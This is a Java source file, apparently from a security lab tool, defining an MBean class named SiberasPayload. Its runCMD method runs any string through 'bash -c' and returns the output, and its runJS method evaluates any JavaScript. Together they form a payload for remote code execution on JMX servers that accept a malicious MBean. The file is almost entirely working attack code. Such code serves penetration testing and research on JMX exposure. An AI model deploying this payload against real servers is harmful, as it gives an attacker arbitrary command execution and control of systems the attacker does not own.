package de.siberas.lab;

import javax.script.ScriptEngineManager;
import java.io.InputStreamReader;
import javax.script.ScriptEngine;

public class SiberasPayload implements SiberasPayloadMBean {

	@Override
	public String runCMD(String cmd) {

		try {
			
			String[] full_cmd = new String[]{"bash","-c",cmd};
			java.lang.Runtime runtime = java.lang.Runtime.getRuntime();
			java.lang.Process p = runtime.exec(full_cmd);

			p.waitFor();

			java.io.InputStream is = p.getInputStream();
			java.io.BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));
      
			java.lang.StringBuilder builder = new StringBuilder();
			String line = null;
			while ( (line = reader.readLine()) != null) {
			   builder.append(line);
			   builder.append(System.getProperty("line.separator"));
			}
			String result = builder.toString();
			
			is.close();
			
			return result;

		} catch(Exception ex) {
			return ex.getMessage();
		}
	}

	@Override
	public String runJS(String js) {
		try {
			ScriptEngineManager factory = new ScriptEngineManager();
			ScriptEngine engine = factory.getEngineByName("JavaScript");
			return (String) engine.eval(js);
		} catch(Exception ex) {
			return ex.getMessage();
		}
	}

}
